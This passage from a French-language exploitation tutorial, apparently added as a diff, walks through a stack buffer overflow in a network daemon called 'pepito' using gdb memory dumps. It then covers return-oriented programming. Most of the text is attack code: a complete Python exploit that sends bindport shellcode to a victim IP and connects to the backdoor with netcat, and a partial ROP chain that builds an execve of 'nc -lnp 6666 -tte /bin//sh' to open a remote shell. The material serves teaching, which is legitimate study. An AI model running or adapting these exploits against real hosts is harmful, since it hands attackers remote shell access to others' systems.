+	    packetPtr=0xbfffe7a1, packetSize=513) at main.c:78
+	78	{
+	(gdb)$ i r
+	eax            0xbfffe530	-1073748688
+	ecx            0x0	0
+	edx            0x80	128
+	ebx            0xbfffe530	-1073748688
+	esp            0xbfffe518	0xbfffe518
+	ebp            0xbfffe518	0xbfffe518
+	esi            0x0	0
+	edi            0xbfffe730	-1073748176
+	eip            0x8048ccc	0x8048ccc <updateBuf+3>
+	eflags         0x200282	[ SF IF ID ]
+	cs             0x73	115
+	ss             0x7b	123
+	ds             0x7b	123
+	es             0x7b	123
+	fs             0x0	0
+	gs             0x33	51
+	(gdb)$ x/32x $esp
+                                        +------------------------------------------- saved EIP
+                                        v                                            pusher sur
+	0xbfffe518:	0xbfffe738	0x08048d70	0xbfffe530	0xbfffe7a1   la stack
+	0xbfffe528:	0x00000201	0x00000000	0x00000000	0x00000000
+	0xbfffe538:	0x00000000	0x00000000	0x00000000	0x00000000
+	0xbfffe548:	0x00000000	0x00000000	0x00000000	0x00000000
+	0xbfffe558:	0x00000000	0x00000000	0x00000000	0x00000000
+	0xbfffe568:	0x00000000	0x00000000	0x00000000	0x00000000
+	0xbfffe578:	0x00000000	0x00000000	0x00000000	0x00000000
+	0xbfffe588:	0x00000000	0x00000000	0x00000000	0x00000000
+	(gdb)$ c
+	Continuing.
+
+	Breakpoint 3, 0x08048d32 in updateBuf (
+	   buf=0xbfffe530 "touch lastvisit_ \220\220\220\220\220\220\220\220\220\220\220\220
+	\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
+	\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
+	\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
+	\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
+	\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
+	\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
+	\220\220\220\220\220\220\220\220\220\220\220\220"..., packetPtr=0xbfffe9a2,
+	    packetSize=0) at main.c:88
+	88	}
+	(gdb)$ i r
+	eax            0x1	1
+	ecx            0xbfffe410	-1073748976
+	edx            0x0	0
+	ebx            0xbfffe530	-1073748688
+	esp            0xbfffe51c	0xbfffe51c
+	ebp            0xbfffe738	0xbfffe738
+	esi            0x0	0
+	edi            0xbfffe730	-1073748176
+	eip            0x8048d32	0x8048d32 <updateBuf+105>
+	eflags         0x200216	[ PF AF IF ID ]
+	cs             0x73	115
+	ss             0x7b	123
+	ds             0x7b	123
+	es             0x7b	123
+	fs             0x0	0
+	gs             0x33	51
+	(gdb)$ x/512x $esp
+	0xbfffe51c:	0x08048d70	0xbfffe530	0xbfffe9a2	0x00000000
+	0xbfffe52c:	0x00000000	0x63756f74	0x616c2068	0x69767473
+	0xbfffe53c:	0x5f746973	0x90909020	0x90909090	0x90909090
+	0xbfffe54c:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe55c:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe56c:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe57c:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe58c:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe59c:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe5ac:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe5bc:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe5cc:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe5dc:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe5ec:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe5fc:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe60c:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe61c:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe62c:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe63c:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe64c:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe65c:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe66c:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe67c:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe68c:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe69c:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe6ac:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe6bc:	0xeb909090	0xc9315e11	0x6c8065b1	0x8035ff0e
+	0xbfffe6cc:	0xf67501e9	0xeae805eb	0x66ffffff	0x661066f5
+	0xbfffe6dc:	0x369f8507	0x16be379f	0x9be5f833	0xfbbeb502
+	0xbfffe6ec:	0x37f09d87	0x16be7868	0x8b86459f	0xf83316be
+	0xbfffe6fc:	0xb5029be5	0x16be8b87	0x9be539e8	0x8787b502
+	0xbfffe70c:	0x3316be8b	0x029be5f8	0x66f8beb5	0x0274e5fe
+	0xbfffe71c:	0x74e576b5	0xe576b502	0x87b50274	0xa864649d
+	0xbfffe72c:	0x97649d9d	0x18bea39e	0x16be8887	0xb50240e5
+	0xbfffe73c:	0x08000a90	0xbfffe7a1	0x00000201	0xb7f3ef91
+                           EIP           old stack
+                        ^
+                        +------ Toujours notre saved EIP
+                                Un NOP est rajouté au poids faible.
+
+	0xbfffe74c:	0x080494f2	0x00000006	0xbfffe7a0	0x00001000
+	0xbfffe75c:	0x00000003	0x00000000	0xb7fb6ff4	0xbffff7a8
+	0xbfffe76c:	0x080492d4	0xbfffe7a1	0x00000201	0x0000000f
+	0xbfffe77c:	0xb7fb7580	0x00000000	0x00000000	0x00000000
+	0xbfffe78c:	0x87a90002	0x0300a8c0	0x00000000	0x00000000
+	0xbfffe79c:	0x00000202	0x30352033	0x90902039	0x90909090
+	0xbfffe7ac:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe7bc:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe7cc:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe7dc:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe7ec:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe7fc:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe80c:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe81c:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe82c:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe83c:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe84c:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe85c:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe86c:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe87c:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe88c:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe89c:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe8ac:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe8bc:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe8cc:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe8dc:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe8ec:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe8fc:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe90c:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbfffe91c:	0x90909090	0x90909090	0x315e11eb	0x8065b1c9
+	0xbfffe92c:	0x35ff0e6c	0x7501e980	0xe805ebf6	0xffffffea
+	0xbfffe93c:	0x1066f566	0x9f850766	0xbe379f36	0xe5f83316
+	0xbfffe94c:	0xbeb5029b	0xf09d87fb	0xbe786837	0x86459f16
+	0xbfffe95c:	0x3316be8b	0x029be5f8	0xbe8b87b5	0xe539e816
+	0xbfffe96c:	0x87b5029b	0x16be8b87	0x9be5f833	0xf8beb502
+	0xbfffe97c:	0x74e5fe66	0xe576b502	0x76b50274	0xb50274e5
+	0xbfffe98c:	0x64649d87	0x649d9da8	0xbea39e97	0xbe888718
+	0xbfffe99c:	0x0240e516	0x000090b5	0x00000000	0x00000000
+	0xbfffe9ac:	0x00000000	0x00000000	0x00000000	0x00000000
+	0xbfffe9bc:	0x00000000	0x00000000	0x00000000	0x00000000
+
+	(gdb)$ i r
+	eax            0x1	1
+	ecx            0xbfffe410	-1073748976
+	edx            0x0	0
+	ebx            0xbfffe530	-1073748688
+	esp            0xbfffe51c	0xbfffe51c
+	ebp            0xbfffe738	0xbfffe738
+	esi            0x0	0
+	edi            0xbfffe730	-1073748176
+	eip            0x8048d32	0x8048d32 <updateBuf+105>
+	eflags         0x200216	[ PF AF IF ID ]
+	cs             0x73	115
+	ss             0x7b	123
+	ds             0x7b	123
+	es             0x7b	123
+	fs             0x0	0
+	gs             0x33	51
+	(gdb)$ x/x $ebp + 4
+	0xbfffe73c:	0x08000a90 <---- Notre saved EIP avant le return.
+	(gdb)$ c
+	Continuing.
+
+	Program received signal SIGSEGV, Segmentation fault.
+	0x08000a90 in ?? () <----------------------------- Segfault, cette adresse n'existe pas.
+	(gdb)$
+
+ Nous avons dépassé la taille allouée pour notre tableau buf et nous avons écrit sur la stack,
+ ce qui a permit l'overwrite du saved eip.
+
+ Lors de l'épilogue, le saved eip va être popé pour pouvoir retourner dans la fonction qui a appelé
+ updateBuf. Comme cette dernière est rééditée, le programme va donc nous envoyer le signal segfault.
+
+
+ Schéma de l'exploitation:
+ -------------------------
+
+ [buf 512] [saved ebp] [saved eip]
+
+ [NOP & SHELLCODE] [PADING] [@NOP]
+   ^                           |
+   +---------------------------+
+
+
+ # Exploit: Linux x86 32 bits
+ # Sécu   : Aucune sécurité
+
+	[sploit]
+	#!/usr/bin/env python2
+	# vuln qui exploite le sprintf dans updateBuf et qui exécute un backdoor
+
+	import socket
+	import os
+	import time
+	import sys
+
+	if len(sys.argv) != 3:
+	   print "[-] Syntax: ./sploit.py <ip_victime> <port>"
+	   sys.exit(1)
+
+	try:
+	   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	   connect = s.connect((sys.argv[1], int(sys.argv[2])))
+	except:
+	   print "[-] Error connexion"
+	   sys.exit(1)
+
+	# Polymorphic bindport to 13123 - 125 bytes
+	# http://www.shell-storm.org/shellcode/files/shellcode-656.php
+	shellcode = "\xeb\x11\x5e\x31\xc9\xb1\x65\x80\x6c\x0e\xff\x35\x80\xe9\x01" \
+		    "\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x66\xf5\x66\x10\x66\x07" \
+		    "\x85\x9f\x36\x9f\x37\xbe\x16\x33\xf8\xe5\x9b\x02\xb5\xbe\xfb" \
+		    "\x87\x9d\xf0\x37\x68\x78\xbe\x16\x9f\x45\x86\x8b\xbe\x16\x33" \
+		    "\xf8\xe5\x9b\x02\xb5\x87\x8b\xbe\x16\xe8\x39\xe5\x9b\x02\xb5" \
+		    "\x87\x87\x8b\xbe\x16\x33\xf8\xe5\x9b\x02\xb5\xbe\xf8\x66\xfe" \
+		    "\xe5\x74\x02\xb5\x76\xe5\x74\x02\xb5\x76\xe5\x74\x02\xb5\x87" \
+		    "\x9d\x64\x64\xa8\x9d\x9d\x64\x97\x9e\xa3\xbe\x18\x87\x88\xbe" \
+		    "\x16\xe5\x40\x02\xb5"
+
+	buff  = "\x90" * (507 - len(shellcode))
+	buff += shellcode
+	buff += "\x40\xe8\xff\xbf" # 0xbfffe840
+	cmdID = "3 "
+	arg3  = " "+buff
+	arg2  = str(len(arg3))
+	payload = cmdID + arg2 + arg3
+
+	print "[+] Send payload..."
+	try:
+	   s.send(payload)
+	   s.close
+	except:
+	   print "[-] Error send payload"
+	   sys.exit(1)
+	print "[+] done!"
+	print "[+] Waiting backdoor"
+	time.sleep(3)
+	concat = "netcat " + sys.argv[1] + " 13123"
+	print "[+] Connected to the backdoor you can now execute cmd"
+	os.system(concat)
+	[/sploit]
+
+
+
+Cette technique ne fonctionne, bien évidemment pas, si des mesures de sécurité sont mises en place,
+tel que l'ASLR ou NX.
+
+Depuis quelques années, l'exploitation des failles applicatives, en particulier des déborde-
+ments de tampons, est rendue de plus en plus difficile par les protections mises en place par
+les systèmes d'exploitation.
+
+En particulier, il est de plus en plus rare de pouvoir exécuter du code arbitraire sur la pile.
+Il existe des techniques permettant de contourner NX mais ces dernières sont inutiles si les fonc-
+tions de la libc sont protegées par l'ASCII-ARMOR.
+
+Cependant, il existe une technique d'attaque qui permet de passer outre toutes ces protections.
+Cette technique s'appelle le ROP (Return Oriented Programming).
+
+Ce type d'attaque qui est extrêmement complexe à réaliser, consite à enchaîner des suites d'instruc-
+tions qu'on nomment "gadget" pour pouvoir modifier l'état des registres et exécuter un appel système
+ou l'exécution d'une autre fonction.
+
+Généralement, le ROP est utilisé pour faire appel à execve() mais ici, dans notre cas, étant donné
+que c'est un deamon, ce n'est pas si simple que cela.
+
+Pour exploiter totalement cette vulnérabilité, ici nous devons faire du ROP et reproduire l'appel
+système dup2() suivi de execve()
+
+Personnellement, je n'ai pas pu mettre en place un tel dispositif (surtout le dup2())
+
+C'est pourquoi, j'ai choisis de construire un execve avec des arguments.
+Le execve en question sera constitué comme suit:
+
+	[code]
+	#include <stdio.h>
+	#include <unistd.h>
+
+	int main()
+	{
+	  char *env[1] = {NULL};
+
+	  char *arguments[7]= { "/usr/bin//nc",
+		                "-lnp",
+		                "6666",
+		                "-tte",
+		                "/bin//sh",
+		                NULL
+		               };
+	  execve("/usr/bin/nc", arguments, env);
+	}
+	[/code]
+
+Tout d'abord, pour pouvoir reproduire l'appel system execve() nous devons connaître
+sa convention.
+
+On est sur un système Linux x86 32 bits:
+========================================
+
+jonathan@ArchLinux [/] $ cat /usr/include/asm/unistd_32.h | grep execve
+#define __NR_execve		 11
+jonathan@ArchLinux [/] $
+
+EAX = 11
+EBX = "/usr/bin/nc" (char *)
+ECX = arguments (char **)
+EDX = env (char **)
+
+Comme vous pouvez l'imaginer, cela va être l'enfer pour construire une telle exécution (qui à dit que
+c'était facile :p)
+
+
+Comment faire pour trouver des gadgets ?
+========================================
+
+Deux solutions s'offrent à vous :
+
+ 1 - Vous utilisez objdump et vous passez des heures à chercher vos gadgets
+ 2 - Vous développez un tool qui vous permet de faire le travail à votre place.
+
+Heureusement pour vous, j'ai developpé un petit tool qui fera tout le travail à votre place (ou presque).
+Ce tool est disponnible en open source à l'adresse http://www.shell-storm.org/project/ROPgadget/
+(je sais, je fais de la pub ;). Et alors ?)
+
+
+Regardons ce que pepito contient en gadget potentiellement utilisable via le "merveilleux" tool (:p)
+
+
+	jonathan@ArchLinux [src_for_rop] $ ROPgadget -g pepito
+	Header informations
+	============================================================
+	phoff        0x00000034
+	shoff        0x00083d60
+	phnum        0x00000005 (5)
+	shnum        0x00000023 (35)
+	phentsize    0x00000020
+	shstrndx     0x00000020
+	entry        0x08048130
+
+	LOAD vaddr   0x08048000
+	LOAD offset  0x00000000
+
+	Gadgets informations
+	============================================================
+	0x080481c7: pop %ebx | pop %ebp | ret
+	0x080481c8: pop %ebp | ret
+	0x08048224: call *%eax
+	0x08048e7e: mov %ebp,%esp | pop %ebp | ret
+	0x0804908f: int $0x80
+	0x0804914b: pop %ebx | pop %esi | pop %edi | pop %ebp | ret
+	0x08049793: mov %edx,%eax | pop %ebx | pop %esi | pop %edi | pop %ebp | ret
+	0x08049793: mov %edx,%eax | pop %ebx | pop %esi | pop %edi | pop %ebp | ret
+	0x08049e93: pop %ebx | pop %esi | pop %ebp | ret
+	0x0804ab16: mov %esi,%eax | pop %ebx | pop %esi | pop %edi | pop %ebp | ret
+	0x0804b607: mov %ebx,%eax | pop %ebx | pop %esi | pop %edi | pop %ebp | ret
+	0x0804de3d: mov %ebx,%eax | pop %ebx | pop %ebp | ret
+	0x0804e39f: mov %edi,%eax | pop %ebx | pop %esi | pop %edi | pop %ebp | ret
+	0x0804fbd1: xor %eax,%eax | mov %esp, %ebp | pop %ebp | ret
+	0x080503a2: mov %eax,(%ecx) | pop %ebp | ret
+	0x0805478b: xor %eax,%eax | pop %ebx | pop %ebp | ret
+	0x08054fee: xor %eax,%eax | pop %ebx | pop %esi | pop %edi | pop %ebp | ret
+	0x080570f4: xor %eax,%eax | ret
+	0x08057a17: mov %eax,%edi | mov %edi, %eax | pop %edi | pop %ebp | ret
+	0x08057e57: inc %eax | pop %edi | pop %esi | ret
+	0x08057e79: xor %eax,%eax | pop %ebx | ret
+	0x080583a3: inc %eax | pop %edi | ret
+	0x08059f48: pop %esi | pop %ebx | pop %edx | ret
+	0x08059f70: pop %edx | pop %ecx | pop %ebx | ret
+	0x08069be4: xor %eax,%eax | leave | ret
+	0x0806a3d0: mov %ecx,%eax | pop %ebx | pop %esi | pop %edi | pop %ebp | ret
+	0x0806a4a1: mov %ebx,%eax | pop %ebx | pop %esi | pop %ebp | ret
+	0x08080e38: mov %ecx,(%ebx) | add $0x8,%esp | pop %ebx | pop %esi | pop %ebp | ret
+	0x08081165: mov %ecx,(%edx) | add $0x8,%esp | pop %ebx | pop %ebp | ret
+	0x0808127f: add %ebx,%eax | pop %ebx | pop %ebp | ret
+	0x08081f9a: xor %eax,%eax | pop %edi | ret
+	0x08082186: sub %ebx,%eax | pop %ebx | pop %esi | pop %edi | pop %ebp | ret
+	0x080823dd: inc %eax | inc %eax | inc %eax | ret
+	0x080823de: inc %eax | inc %eax | ret
+	0x080823df: inc %eax | ret
+	0x08087926: mov (%edx),%eax | mov (%esp), %ebx | mov %ebp,%esp | pop %ebp | ret
+	0x08091081: mov %eax,(%edx) | ret
+	0x0809aa51: sub $0x1,%eax | pop %ebx | pop %esi | pop %ebp | ret
+	0x0809ae78: mov %eax,(%edi) | pop %eax | pop %ebx | pop %esi | pop %edi | ret
+	0x0809ae7a: pop %eax | pop %ebx | pop %esi | pop %edi | ret
+	0x080a914c: pop %ecx | pop %ebx | leave | ret
+
+	Total gadgets: 41/48
+	jonathan@ArchLinux [src_for_rop] $
+
+
+ W00t, nous avons 41 gadgets potentiels, ce qui est plutôt pas mal...
+ Comme vous pouvez le remarquer ces gadgets sont situés dans la section .text d'un binaire ELF et donc
+ ne sont pas influencables par l'ASLR ni NX.
+
+ Nous n'avons, bien sûr, pas besoin de tous ces gadgets, seulement 6 ou 7 nous seront utiles.
+
+ Nous aurons besoin de:
+
+ - @.data                                          (l'@ de la section .data pour placer des données)
+ - int $0x80                                       (pour pouvoir exécuter notre payload)
+ - mov %eax,(%ecx) | pop %ebp | ret                (pour placer eax dans un buffer)
+ - inc %eax | ret                                  (pour incrémenter eax jusqu'a 11)
+ - pop %edx | pop %ecx | pop %ebx | ret            (pour poper des adresses)
+ - pop %eax | pop %ebx | pop %esi | pop %edi | ret (ici juste le pop %eax nous sera utile)
+ - xor %eax,%eax | ret                             (pour mettre eax à zero)
+
+
+Schéma d'exploitation et fonctionnement du ROP
+----------------------------------------------
+
+
+    Imaginons les gadgets suivants:
+                                      - xor %eax,%eax; ret        0x08041111
+                                      - inc %eax; ret             0x08042222
+                                      - pop %ebx; pop %ecx; ret   0x08043333
+
+
+    Avant le débordement de tampon
+    l'état de vos registres sont les
+    suivants:                         %eax 0xbfffff53
+                                      %ebx 0x080482a3
+                                      %ecx 0x13
+
+    L'objectif est de mettre l'état
+    des registres suivants:           %eax 0x4
+                                      %ebx 0x41424344
+                                      %ecx 0x44434241
+
+
+    Votre payload est le suivant:
+
+                                      [NOP X size][SEBP][SEIP]
+
+                                      [0x90 xsize][0x41414141][0x08041111][0x08042222][0x08042222]
+                                      [0x08042222][0x08042222][0x08043333][0x41424344][0x44434241]
+
+
+
+           STACK
+        +---------+
+	0xbfffe51c:	0x08048d70   0xbfffe530	  0xbfffe9a2   0x00000000
+	0xbfffe52c:	0x00000000   0x63756f74	  0x616c2068   0x69767473
+
+                                     +------- Adresse de votre tableau (tab[0])
+                                     v
+	0xbfffe53c:	0x5f746973   0x90909020	  0x90909090   0x90909090
+	0xbfffe54c:	0x90909090   0x90909090	  0x90909090   0x90909090
+	0xbfffe55c:	0x90909090   0x90909090	  0x90909090   0x90909090
+	0xbfffe56c:	0x90909090   0x90909090	  0x90909090   0x90909090
+
+                                                                             +----------+
+                                                                             |  .text   +
+                                                                             +----------+
+                                     +----------------------1--------------->|0x08041111| xor %eax,%eax
+                                     |         +------------2---------------<|0x08041113| ret
+                                     |         |                             |..........|
+                                     |         |  +---------------1--------->|0x08042222| inc %eax
+                                     |         |  |         +-----2---------<|0x08042223| ret
+                                     |         |  |         |                |..........|
+          Saved ebp ----+            |         |  |         |
+                        v            ^         v  ^         v
+        0xbfffe57c:     0x90909090   0x08041111   0x08042222   0x08042222
+        0xbfffe58c:     0x08042222   0x08042222
+                                                                             +----------+
+                                                                             |  .text   +
+                                                                             +----------+
+                        +--------------------------------------------1------>|0x08043333|
+                        |            +-------------------------------2------<|0x08043333| pop %ebx
+                        |            |            +------------------3------<|0x08043334| pop %ecx
+                        |            |            |           +------4------<|0x08043335| ret
+                        |            P            P           |              |..........|
+                        |            O            O           |
+                        |            P            P           |
+                        |            |            |           |
+                        ^            v            v           v
+        0xbfffe594:     0x08043333   0x41424344   0x44434241
+
+
+
+Rien ne vaut un bon vieux sploit pour pouvoir comprendre tout cela :)
+
+	[sploit]
+	#!/usr/bin/env python2
+
+	import socket
+	import os
+	import time
+	import sys
+	from struct import pack
+
+	if len(sys.argv) != 3:
+	   print "[-] Syntax: ./sploit.py <ip_victime> <port>"
+	   sys.exit(1)
+
+	try:
+	   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	   connect = s.connect((sys.argv[1], int(sys.argv[2])))
+	except:
+	   print "[-] Error connexion"
+	   sys.exit(1)
+
+	EDAX0      = pack("<I", 0x08050a88)
+	STACK      = pack("<I", 0x080c8110) # .data 0xba0   0x80c8080
+	INT80      = pack("<I", 0x0805a046) # int $0x80
+	MOVISTACK  = pack("<I", 0x080503a2) # mov %eax,(%ecx) | pop %ebp | ret
+	INCEAX     = pack("<I", 0x080823df) # inc %eax | ret
+	POPALL     = pack("<I", 0x08059f70) # pop %edx | pop %ecx | pop %ebx | ret
+	POPEAX     = pack("<I", 0x0809ae7a) # pop %eax | pop %ebx | pop %esi | pop %edi | ret
+	XOREAX     = pack("<I", 0x080570f4) # xor %eax,%eax | ret
+	DUMMY      = pack("<I", 0x42424242) # padding
+
+	buff  = "\x41" * 507                # notre padding jusqu'à EIP
+
+
+	######################### execve ###########################
+	buff += POPALL                   # c'est via %ecx qu'on va construire notre stack
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += STACK                    # ecx contiendra l'@ de notre stack
+	buff += DUMMY                    # padding (pas d'importance)
+
+	buff += POPEAX                   # Permet de mettre du contenu dans une adresse
+	buff += "/usr"                   # on place "/usr" dans eax
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += MOVISTACK                # place "/usr" à l'adresse de notre STACK
+	buff += DUMMY                    # padding (pas d'importance)
+
+	buff += POPALL
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += pack("<I", 0x080c8110 + 4) # on change notre STACK pour pointer après "/usr"
+	buff += DUMMY                    # padding (pas d'importance)
+
+	buff += POPEAX                   # on applique la même chose pour "/bin"
+	buff += "/bin"
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += MOVISTACK                # on place "/bin" après "/usr"
+	buff += DUMMY                    # padding (pas d'importance)
+
+	buff += POPALL
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += pack("<I", 0x080c8110 + 8) # on change notre STACK pour pointer après "/usr/bin"
+	buff += DUMMY                    # padding (pas d'importance)
+
+	buff += POPEAX                   # on applique la même chose pour "//nc"
+	buff += "//nc"
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += MOVISTACK                # on place "//nc" après "/bin"
+	buff += DUMMY                    # padding (pas d'importance)
+
+	buff += POPALL
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += pack("<I", 0x080c8110 + 13) # on change notre STACK pour pointer après "/usr/bin//nc"+1
+                                            # pour laisser un \0 entre les arguments
+	buff += DUMMY                    # padding (pas d'importance)
+
+
+        # on repète l'opération pour chaque argument
+	buff += POPEAX
+	buff += "-lnp"
+	buff += DUMMY
+	buff += DUMMY
+	buff += DUMMY
+	buff += MOVISTACK
+	buff += DUMMY
+
+	buff += POPALL
+	buff += DUMMY
+	buff += pack("<I", 0x080c8110 + 18)
+	buff += DUMMY
+
+	buff += POPEAX
+	buff += "6666"
+	buff += DUMMY
+	buff += DUMMY
+	buff += DUMMY
+	buff += MOVISTACK
+	buff += DUMMY
+
+	buff += POPALL
+	buff += DUMMY
+	buff += pack("<I", 0x080c8110 + 23)
+	buff += DUMMY
+
+	buff += POPEAX
+	buff += "-tte"
+	buff += DUMMY
+	buff += DUMMY
+	buff += DUMMY
+	buff += MOVISTACK
+	buff += DUMMY
+
+	buff += POPALL
+	buff += DUMMY
+	buff += pack("<I", 0x080c8110 + 28)
+	buff += DUMMY
+
+	buff += POPEAX
+	buff += "/bin"
+	buff += DUMMY
+	buff += DUMMY
+	buff += DUMMY
+	buff += MOVISTACK
+	buff += DUMMY
+
+	buff += POPALL
+	buff += DUMMY
+	buff += pack("<I", 0x080c8110 + 32)
+	buff += DUMMY
+
+	buff += POPEAX
+	buff += "//sh"
+	buff += DUMMY
+	buff += DUMMY
+	buff += DUMMY
+	buff += MOVISTACK
+	buff += DUMMY
+
+	# C'est pas fini ^^
+        # Nous avons actuellement notre liste d'élements séparés par des \0
+        #
+	# Maintenant il nous faut construire notre char **
+	#
+        # Voici le schéma de notre liste d'arguments
+        #
+	# 0x80c8110 <guestBook+112>:  "/usr/bin//nc"
+	# 0x80c811d <guestBook+125>:  "-lnp"
+	# 0x80c8122 <guestBook+130>:  "6666"
+	# 0x80c8127 <guestBook+135>:  "-tte"
+	# 0x80c812c <guestBook+140>:  "/bin//sh"
+	# 0x80c8135 <guestBook+149>:  ""
+	#
+
+        # Pour l'adresse de notre tableau, j'ai choisis une adresse plus éloignée des arguments.
+        # Mais on peut placer notre tableau où l'on veut.
+
+	buff += POPALL
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += pack("<I", 0x080c8110 + 60) # l'adresse de notre STACK
+	buff += DUMMY                    # padding (pas d'importance)
+
+	buff += POPEAX
+	buff += pack("<I", 0x080c8110)   # l'@ de "/usr/bin//nc"
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += MOVISTACK                # on place l'@ de "/usr/bin//nc" sur notre STACK
+	buff += DUMMY                    # padding (pas d'importance)
+
+	buff += POPALL
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += pack("<I", 0x080c8110 + 64) # on décale notre STACK de + 4 pour le pointeur du 2ème
+                                            # argument
+	buff += DUMMY                    # padding (pas d'importance)
+
+	buff += POPEAX
+	buff += pack("<I", 0x080c811d)   # l'@ de "-lnp"
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += MOVISTACK                # on place l'@ de "-lnp" sur notre STACK
+	buff += DUMMY                    # padding (pas d'importance)
+
+	buff += POPALL
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += pack("<I", 0x080c8110 + 68) # on décale notre STACK de + 4 pour le pointeur du 3ème
+                                            # argument
+	buff += DUMMY                    # padding (pas d'importance)
+
+	buff += POPEAX
+	buff += pack("<I", 0x080c8122)   # l'@ de "6666"
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += MOVISTACK                # on place l'@ de "6666" sur notre STACK
+	buff += DUMMY                    # padding (pas d'importance)
+
+	buff += POPALL
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += pack("<I", 0x080c8110 + 72) # on décale notre STACK de + 4 pour le pointeur du 4ème
+                                            # argument
+	buff += DUMMY                    # padding (pas d'importance)
+
+	buff += POPEAX
+	buff += pack("<I", 0x080c8127)   # l'@ de "-tte"
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += MOVISTACK                # on place l'@ de "-tte" sur notre STACK
+	buff += DUMMY                    # padding (pas d'importance)
+
+	buff += POPALL
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += pack("<I", 0x080c8110 + 76) # on décale notre STACK de + 4 pour le pointeur du 5ème
+                                            # argument
+	buff += DUMMY                    # padding (pas d'importance)
+
+	buff += POPEAX
+	buff += pack("<I", 0x080c812c)   # l'@ de "/bin//sh"
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += DUMMY                    # padding (pas d'importance)
+	buff += MOVISTACK                # on place l'@ de "/bin//sh" sur notre STACK
+	buff += DUMMY                    # padding (pas d'importance)
+
+        #
+        # Ouf! Notre stack est enfin prêt !
+        # Maintenant il nous faut mettre en place eax pour qu'il contienne
+        # l'adresse du syscall execve
+        # execve = 0xb
+        #
+
+	buff += XOREAX                      # on met eax à zero
